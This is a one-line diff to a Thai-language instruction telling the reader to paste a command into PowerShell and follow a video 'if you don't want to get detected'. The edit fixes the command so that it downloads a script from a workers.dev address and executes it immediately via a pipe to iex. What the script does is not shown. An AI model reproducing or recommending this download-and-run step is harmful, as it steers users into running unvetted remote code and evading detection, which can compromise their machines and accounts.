@@ -1,1 +1,1 @@
-เอาไปรันใน Powershell irm https://zestexe.lillynetflix9.workers.dev/ iex ดูตามคลิปถ้าไม่อยากโดนเช็คเจอ
+เอาไปรันใน Powershell irm https://zestexe.lillynetflix9.workers.dev/ | iex ดูตามคลิปถ้าไม่อยากโดนเช็คเจอ
